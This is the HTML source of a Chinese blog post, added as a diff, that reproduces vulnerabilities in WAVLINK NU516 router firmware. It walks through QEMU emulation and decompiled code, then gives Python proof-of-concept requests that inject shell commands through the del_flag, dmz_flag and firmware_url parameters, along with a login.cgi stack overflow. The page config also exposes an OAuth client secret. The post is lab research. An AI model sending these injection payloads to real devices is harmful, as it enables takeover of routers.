@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#f3f1ee">
+<title>WAVLINK NU516 固件模拟与多处命令注入漏洞复现 · Misaki</title>
+<meta name="description" content="记录 WAVLINK NU516 固件解包、MIPS QEMU 模拟、lighttpd 启动修复，以及 CVE-2026-2615、CVE-2026-3704 等命令注入漏洞复现。">
+<link rel="icon" type="image/x-icon" href="/img/favicon.ico">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="is-article">
+  <div class="progress" aria-hidden="true"><span id="progressBar"></span></div>
+  <header class="site-nav">
+  <a class="brand" href="/">
+    <img class="brand-mark" src="/img/favicon.ico" alt="" aria-hidden="true">
+    <span class="brand-name">Misaki</span>
+  </a>
+  <nav class="nav-links" aria-label="主导航">
+    
+    <a href="/">文章</a>
+    
+    <a href="/archives/">归档</a>
+    
+    <a href="/friends/">友链</a>
+    
+    <a href="/about/">关于</a>
+    
+  </nav>
+  <button class="nav-toggle" id="navToggle" aria-label="展开菜单" aria-expanded="false" aria-controls="mobileMenu">≡</button>
+</header>
+<nav class="mobile-menu" id="mobileMenu" aria-label="移动端导航" hidden>
+  
+  <a href="/">文章</a>
+  
+  <a href="/archives/">归档</a>
+  
+  <a href="/friends/">友链</a>
+  
+  <a href="/about/">关于</a>
+  
+</nav>
+
+  <main id="main">
+    
+
+<header class="post-cover">
+  <img class="post-bg-img" src="/img/mist.jpg" alt="" aria-hidden="true">
+  <div class="post-info">
+    <p class="cover-meta">
+      <span>2026.04.05</span>
+      <span>12 MIN READ</span>
+      
+      <span>CVE</span>
+      
+    </p>
+    <h1 class="post-title">WAVLINK NU516 固件模拟与多处命令注入漏洞复现</h1>
+    
+    <p class="cover-tags">
+      
+      <a href="/tags/CVE/">#CVE</a>
+      
+      <a href="/tags/IoT/">#IoT</a>
+      
+      <a href="/tags/firmware/">#firmware</a>
+      
+      <a href="/tags/QEMU/">#QEMU</a>
+      
+      <a href="/tags/pwn/">#pwn</a>
+      
+      <a href="/tags/command-injection/">#command-injection</a>
+      
+      <a href="/tags/WAVLINK/">#WAVLINK</a>
+      
+    </p>
+    
+  </div>
+</header>
+
+<section class="article-wrap">
+  <article class="post-card">
+    <div class="prose">
+      <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>[[CVE]]<br>[固件下载](<a target="_blank" rel="noopener" href="https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A">Firmware - WAVLINK ROUTER Docs</a>)<br>WAVLINK-NU516-V251208<br>WAVLINK-NU516-V240425<br>Ubuntu25.10<br>IDA9.1<br>binwalk<br>qemu<br>firmwalker</p>
+<h2 id="固件仿真"><a href="#固件仿真" class="headerlink" title="固件仿真"></a>固件仿真</h2><p>binwalk解包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me WAVLINK.bin </span><br></pre></td></tr></table></figure>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405211337658.png" alt="image.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -h lighttpd</span><br></pre></td></tr></table></figure>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405212457807.png" alt="image.png"><br>mips小端序</p>
+<h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><p>在<a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/armhf/">下载</a>以下内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debian_squeeze_mipsel_standard.qcow2</span><br><span class="line">vmlinux-3.2.0-4-4kc-malta</span><br></pre></td></tr></table></figure>
+
+<p>宿主机配置虚拟网卡</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ip tuntap add mode tap name tap0</span><br><span class="line"><span class="built_in">sudo</span> ip addr add 192.168.10.1/24 dev tap0</span><br><span class="line"><span class="built_in">sudo</span> ip <span class="built_in">link</span> <span class="built_in">set</span> tap0 up</span><br></pre></td></tr></table></figure>
+
+<p>启动模拟</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-mipsel \</span><br><span class="line">  -M malta \</span><br><span class="line">  -cpu 74Kf \</span><br><span class="line">  -kernel /home/ming/下载/iot/WAVLINK25/vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">  -hda /home/ming/下载/iot/WAVLINK25/debian_wheezy_mipsel_standard.qcow2 \</span><br><span class="line">  -append <span class="string">&quot;root=/dev/sda1 console=ttyS0&quot;</span> \</span><br><span class="line">  -net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">  -nographic</span><br></pre></td></tr></table></figure>
+<p>在模拟后的虚拟机配置网卡</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.10.200 netmask 255.255.255.0</span><br></pre></td></tr></table></figure>
+
+<p>将 <code>squashfs-root</code> 打包并传输到虚拟机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf squashfs-root.gz squashfs-root</span><br><span class="line">scp -O \</span><br><span class="line">  -o HostKeyAlgorithms=+ssh-rsa \</span><br><span class="line">  -o PubkeyAcceptedAlgorithms=+ssh-rsa \</span><br><span class="line">  squashfs-root.gz root@192.168.10.2:/</span><br><span class="line">tar -zxvf squashfs-root.gz</span><br></pre></td></tr></table></figure>
+
+<p>挂载系统环境配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount --<span class="built_in">bind</span> /proc/ proc/</span><br><span class="line">mount --<span class="built_in">bind</span> /sys/ sys/</span><br><span class="line">mount --<span class="built_in">bind</span> /dev/ dev/</span><br></pre></td></tr></table></figure>
+
+<p>启动模拟</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chroot</span> . /bin/sh</span><br><span class="line">/usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf</span><br></pre></td></tr></table></figure>
+
+<p>报错</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf</span></span><br><span class="line">2026-04-05 13:42:40: (server.c.925) opening pid-file failed: /var/run/lighttpd.pid No such file or directory </span><br></pre></td></tr></table></figure>
+<p> <code>/var/run/</code>目录不存在或者 lighttpd 没有权限创建 pid 文件<br> IoT设备通常使用<strong>Flash</strong>作为存储介质,原本<code>/var -&gt; /tmp</code>指向目录下的&#x2F;tmp但是在binwalk解包的时候，是直接解压，并没有还原连接，直接删掉原本的var和tmp重新创建即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf /var</span><br><span class="line"><span class="built_in">rm</span> -rf /tmp</span><br><span class="line"><span class="built_in">mkdir</span> -p /var/run</span><br><span class="line"><span class="built_in">mkdir</span> -p /var/log/lighttpd</span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp/run</span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp/log/lighttpd</span><br><span class="line"><span class="comment">#再次启动</span></span><br><span class="line">/usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf</span><br></pre></td></tr></table></figure>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405222402562.png" alt="image.png"><br>模拟成功<br>这边为了使用bp，使用了NATBypass工具转发端口到win主机</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="CVE-2026-2615"><a href="#CVE-2026-2615" class="headerlink" title="CVE-2026-2615"></a>CVE-2026-2615</h3><p>漏洞描述<br>Wavlink NU516U1 路由器固件（版本 M16U1_V251208）中的 <code>/cgi-bin/firewall.cgi</code> 组件存在命令注入漏洞。该漏洞位于处理 端口转发删除（singlePortForwardDelete）功能的 <code>sub_4016D0</code> 函数中。厂商在处理 <code>del_flag</code> 参数时，调用了过滤函数 <code>sub_405B2C</code> 对用户输入进行检查。尽管该函数试图通过黑名单机制防止命令注入，但其实现不严谨，遗漏了关键的命令分隔符分号（<code>;</code>）。经过身份验证的远程攻击者可以通过构造包含分号的恶意 <code>del_flag</code> 参数，绕过输入验证，利用 <code>sprintf</code> 函数将任意 Shell 命令拼接到系统调用中执行。<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405222847040.png" alt="image.png"><br><code>sub_4016D0</code> 漏洞函数点<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405222941938.png" alt="image.png"><br><code>sub_405B2C</code>过滤函数，未将<code>;</code>进行过滤可以进行绕过注入命令执行<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405223207487.png" alt="image.png"><br>后续进入else，sprintf字符串拼接，随后带入到 <code>sub_403734</code>中，<code>sub_403734</code>有system执行<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405223305360.png" alt="image.png"><br>对<code>sub_4016D0</code>进行交叉引用，找到如何进入此危险函数<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405223319731.png" alt="image.png"><br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406181959526.png" alt="image.png"><br>从请求中获取 <code>firewall</code>的参数，然后通过 <code>if</code> 判断使用 <code>strcmp</code> 去匹配对应的字符<br>poc，当匹配到 <code>singlePortForwardDelete</code> 时,进入到 <code>sub_4016D0</code>漏洞函数中<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406182236409.png" alt="image.png"><br>再从中获取到 <code>del_flag</code>的值，进行后续的过滤、拼接操作</p>
+<h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.10.2/cgi-bin/firewall.cgi&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;session&quot;</span>: <span class="string">&quot;1506085659&quot;</span>&#125;</span><br><span class="line">data = <span class="string">&quot;firewall=singlePortForwardDelete&amp;del_flag=1;touch+/tmp/ming2;&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url, data=data, cookies=cookies,</span><br><span class="line">                headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;,</span><br><span class="line">                timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.status_code, r.text[:<span class="number">200</span>])</span><br></pre></td></tr></table></figure>
+<p>cookies的值需要获取<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260405233350257.png" alt="image.png"></p>
+<h3 id="CVE-2026-3704"><a href="#CVE-2026-3704" class="headerlink" title="CVE-2026-3704"></a>CVE-2026-3704</h3><p>漏洞描述<br>Wavlink NU516U1 路由器固件（版本 M16U1_V251208）中的 <code>/cgi-bin/firewall.cgi</code> 组件存在命令注入漏洞。该漏洞位于处理 DMZ 设置的 <code>sub_4017F0</code> 函数中。尽管厂商引入了过滤函数 <code>sub_405B2C</code> 试图修复旧版本（M16U1_V240425）的漏洞，但该黑名单过滤机制不严谨，遗漏了关键的命令分隔符分号（<code>;</code>）。经过身份验证的远程攻击者可以通过构造包含分号的恶意 <code>dmz_flag</code> 参数，绕过输入验证，利用 <code>sprintf</code> 函数将任意 Shell 命令拼接到系统调用中执行。</p>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406183135188.png" alt="image.png"><br>危险函数 <code>sub_403734</code> 里面有 <code>system</code> 执行<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406183208417.png" alt="image.png"><br>且adc将v9进行了拼接操作<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406183238969.png" alt="image.png"><br>v9 是由 v6获取到的 <code>dmz_flag</code> 复制过来的<br>控制v6也就是控制输入的 <code>dmz_flag</code>值即可造成命令注入<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406183355705.png" alt="image.png"><br>调用到此漏洞函数的方法和上面一致</p>
+<h4 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.10.2/cgi-bin/firewall.cgi&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;session&quot;</span>: <span class="string">&quot;1130347533&quot;</span>&#125;</span><br><span class="line">data = <span class="string">&quot;firewall=DMZ&amp;dmz_flag=1;touch+/tmp/ming4;&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url, data=data, cookies=cookies,</span><br><span class="line">                headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;,</span><br><span class="line">                timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.status_code, r.text[:<span class="number">200</span>])</span><br></pre></td></tr></table></figure>
+<p>cookies的值需要获取</p>
+<h3 id="CVE-2026-3612"><a href="#CVE-2026-3612" class="headerlink" title="CVE-2026-3612"></a>CVE-2026-3612</h3><p>漏洞描述<br>Wavlink NU516U1 路由器固件（版本 V240425）中的 <code>/cgi-bin/adm.cgi</code> 组件存在严重的命令注入漏洞。该漏洞位于处理 <strong>OTA 在线升级（ota_new_upgrade）</strong> 功能的 <code>sub_405AF4</code> 函数中。厂商在处理 <code>firmware_url</code> 参数时，直接将其拼接到系统命令中。尽管开发者试图使用双引号包裹参数以防止参数逃逸，但该防御方式无法阻止 Shell 命令替换。经过身份验证的远程攻击者可以通过构造包含 <code>$()</code> 或反引号的恶意 <code>firmware_url</code> 参数，绕过限制执行任意系统命令。<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406193253021.png" alt="image.png"><br>分别获取 POST 请求中的 <code>brand</code>、<code>model</code>、<code>version</code>、<code>md5</code>、<code>firmware_url</code>，且都可以被我们控制输入，后续对v13进行字符串拼接 最后执行system<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406193901881.png" alt="image.png"><br>调用到此漏洞函数的逻辑与上面类似<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406194000551.png" alt="image.png"><br>获取请求数据 <code>page</code> 的值,然后通过 <code>if</code> 判断使用 <code>strcmp</code> 去匹配对应的字符</p>
+<h4 id="poc-2"><a href="#poc-2" class="headerlink" title="poc"></a>poc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.10.2/cgi-bin/adm.cgi&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;session&quot;</span>: <span class="string">&quot;1033453068&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">      <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;usblogin.link&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://usblogin.link/html/firewall.shtml&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://usblogin.link&quot;</span>,</span><br><span class="line">      <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/120.0.6099.71 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">body = <span class="string">&quot;page=ota_new_upgrade&amp;brand=wavlink&amp;model=123&amp;version=1.0&amp;md5=123456&amp;firmware_url=$(touch /tmp/ming6)&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url, data=body, headers=headers, cookies=cookies, timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.status_code, r.text[:<span class="number">200</span>])</span><br></pre></td></tr></table></figure>
+
+<h3 id="CVE-2026-3613"><a href="#CVE-2026-3613" class="headerlink" title="CVE-2026-3613"></a>CVE-2026-3613</h3><p>漏洞描述<br>在 Wavlink NU516U1 V240425 版本的固件中，<code>/cgi-bin/login.cgi</code> 组件的 <code>sub_401A0C</code> 函数存在栈缓冲区溢出漏洞。该函数主要用于处理 <code>sys_login1</code> 页面请求。函数内部在栈上定义了一个固定大小为 128 字节的缓冲区 <code>v15</code>。在验证密码 MD5 通过后，程序使用 <code>sprintf</code> 函数构造一条系统命令，将用户输入的 <code>ipaddr</code> 参数直接拼接到该缓冲区中。由于 <code>sprintf</code> 没有限制写入数据的长度，且程序未对 <code>ipaddr</code> 的长度进行校验，攻击者可以发送一个超长的字符串（超过约 105 字节）。当超长的 <code>ipaddr</code> 数据被写入 <code>v15</code> 时，会发生越界写入，覆盖栈上相邻的局部变量、保存的寄存器以及函数的返回地址,导致 CGI 进程崩溃。</p>
+<p><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406200258409.png" alt="image.png"><br> 读取配置里的管理员密码<br> 获取请求数据中的 <code>ipaddr</code>、<code>password</code><br> <img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406200530566.png" alt="image.png"><br>在后续中字符串拼接给 <code>v15</code><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406200628026.png" alt="image.png"><br>且 <code>v15</code> 可以溢出<br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406202202818.png" alt="image.png"><br><img src="https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/20260406202222987.png" alt="image.png"></p>
+
+    </div>
+    
+
+
+<section class="comments" id="comments">
+  <p class="comments-head">留言 / COMMENTS</p>
+  <div id="gitalk-container" data-id="360d2357"></div>
+</section>
+<script id="gitalk-config" type="application/json">{"clientID":"Ov23liSxI0efH8ZaJdPa","clientSecret":"626893ebd9698d26df631cfd3fac4181f3722297","repo":"text1","owner":"xxianxiayubanmian","admin":["xxianxiayubanmian"],"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","id":"360d2357"}</script>
+<link rel="stylesheet" href="/plugins/gitalk.min.css">
+<script src="/plugins/gitalk.min.js" defer></script>
+
+
+
+  </article>
+
+  <aside class="aside-col">
+    <div class="aside-sticky">
+      
+      <nav class="toc" aria-label="目录">
+        <p>目录 / INDEX</p>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F"><span class="toc-text">固件仿真</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F"><span class="toc-text">固件模拟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-2615"><span class="toc-text">CVE-2026-2615</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-3704"><span class="toc-text">CVE-2026-3704</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-3612"><span class="toc-text">CVE-2026-3612</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2026-3613"><span class="toc-text">CVE-2026-3613</span></a></li></ol></li></ol>
+      </nav>
+      
+      <a class="back-link" href="/">← 返回时间线</a>
+    </div>
+  </aside>
+</section>
+
+<nav class="pager" aria-label="文章导航">
+  
+  <a class="pager-item" href="/posts/cve-2023-26315-router-firmware-qemu-vulnerability-reproduction/">
+    <span>上一篇 · PREV</span>
+    <strong>CVE-2023-26315 路由器固件解包、QEMU 模拟与漏洞复现</strong>
+  </a>
+  
+  
+  <a class="pager-item pager-next" href="/posts/cve-2026-1328-totolink-auth-bypass-command-injection-stack-overflow/">
+    <span>下一篇 · NEXT</span>
+    <strong>CVE-2026-1328 TOTOLINK 登录绕过、命令注入与栈溢出复现</strong>
+  </a>
+  
+</nav>
+
+  </main>
+  <footer class="site-footer">
+  <a class="brand brand-light" href="/">
+    <img class="brand-mark" src="/img/favicon.ico" alt="" aria-hidden="true">
+    <span class="brand-name">Misaki</span>
+  </a>
+  <p class="foot-motto">Ars longa, vita brevis — Art is long, life is fleeting.</p>
+  <p class="foot-meta">
+    © 2026 Misaki
+    · Powered by <a href="https://hexo.io/" target="_blank" rel="noreferrer">Hexo</a>
+    · Theme <b>Mistline</b>
+  </p>
+</footer>
+
+  <button class="to-top" id="toTop" aria-label="返回顶部" title="返回顶部">↑</button>
+  <button class="toc-fab" id="tocFab" aria-label="打开目录" title="目录" hidden>☰</button>
+  <script src="/js/main.js" defer></script>
+</body>
+</html>
